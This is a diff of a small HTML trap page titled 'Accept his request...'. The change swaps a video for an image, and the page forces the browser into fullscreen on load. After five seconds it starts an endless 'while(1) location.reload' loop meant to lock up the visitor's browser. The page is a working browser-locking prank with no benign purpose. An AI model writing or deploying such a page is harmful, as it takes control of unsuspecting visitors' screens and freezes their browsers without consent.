@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Accept his request...</title></title>
+<title>Accept his request...</title>
 <style>
   body, html {
     margin: 0;
@@ -25,25 +25,18 @@
 </head>
 <body>
 
-<video id="sigma" controls autoplay>
-  <!-- Provide the path to the video file on your desktop -->
-  <source src="video.mp4" type="video/mp4">
-  Your browser does not support the video tag.
-</video>
+<img id="sigma" src="untitled.jpeg" alt="Image">
 
 <script>
-  // Get the video element
-  var video = document.getElementById("sigma");
-
-  // When the video ends, navigate to the predefined URL
-  video.onended = function() {
-    while(1)location.reload(1);
-  };
-
-  // Put the website in fullscreen mode
+  // Put the website in fullscreen mode right away
   document.documentElement.requestFullscreen().catch(function(err) {
     console.error(err);
   });
+
+  // Reload the page indefinitely
+  setTimeout(function() {
+    while(1) location.reload(1);
+  }, 5000); // Adjust the delay (5000ms = 5 seconds) before reloading
 </script>
 
 </body>
